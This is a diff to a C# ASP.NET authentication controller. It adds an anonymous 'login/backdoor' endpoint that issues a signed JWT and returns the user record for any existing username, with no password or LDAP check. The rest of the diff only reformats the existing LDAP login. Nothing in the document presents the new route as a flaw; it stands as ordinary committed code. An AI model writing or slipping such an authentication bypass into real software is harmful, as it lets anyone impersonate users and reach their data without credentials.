@@ -40,6 +40,19 @@ namespace backend.Controllers
             LDAP_AUTH = setting.ldap_auth;
         }
 
+        [HttpPost("login/backdoor"), AllowAnonymous]
+        public ActionResult loginBD(Login body)
+        {
+            UserSchema user = _userService.Get(body.username);
+            if (user == null)
+            {
+                return Unauthorized(new { success = false, message = "Please contact FAE assign this username" });
+            }
+            string token = GenerateJSONWebToken(user);
+            // return Ok(res);
+            return Ok(new { success = true, token, data = user });
+
+        }
         [HttpPost("login/ldap"), AllowAnonymous]
         public async Task<ActionResult> loginAD(Login body)
         {
@@ -62,8 +75,9 @@ namespace backend.Controllers
                     HttpResponseMessage response = await client.PostAsync(LDAP_AUTH + "/authentication/ldap", content);
 
                     res = JsonConvert.DeserializeObject<AD_API>(response.Content.ReadAsStringAsync().Result);
-                    if (res.success == false) {
-                        return Unauthorized(new { success = false, message = "username or password incorrect."});
+                    if (res.success == false)
+                    {
+                        return Unauthorized(new { success = false, message = "username or password incorrect." });
                     }
                     token = GenerateJSONWebToken(user);
                     // return Ok(res);
